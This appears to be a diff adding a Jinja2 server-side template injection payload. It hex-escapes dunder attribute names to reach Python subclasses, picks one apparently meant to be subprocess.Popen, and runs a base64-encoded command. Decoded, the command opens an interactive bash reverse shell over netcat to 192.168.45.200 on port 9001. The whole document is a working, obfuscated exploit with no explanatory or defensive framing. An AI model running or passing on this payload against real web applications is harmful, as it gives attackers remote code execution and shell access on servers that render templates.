@@ -1,0 +1,9 @@
+{{\% set string = "test" \%}}
+{{\% set class = "\x5f\x5fclass\x5f\x5f" \%}}
+{{\% set mro = "\x5f\x5fmro\x5f\x5f" \%}}
+{{\% set subclasses = "\x5f\x5fsubclasses\x5f\x5f" \%}}
+{{\% set mro = string|attr(class)|attr(mro) \%}}
+{{\% set subclasses = mro[1]|attr(subclasses)() \%}}
+{{\% set subprocess = subclasses[391] \%}}
+{{\% set shellcode = "echo cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnwvYmluL2Jhc2ggLWkgMj4mMXxuYyAxOTIuMTY4LjQ1LjIwMCA5MDAxID4vdG1wL2Y= | base64 -d  | sh" \%}}
+{{{{subprocess(shellcode, shell=True)}}}}
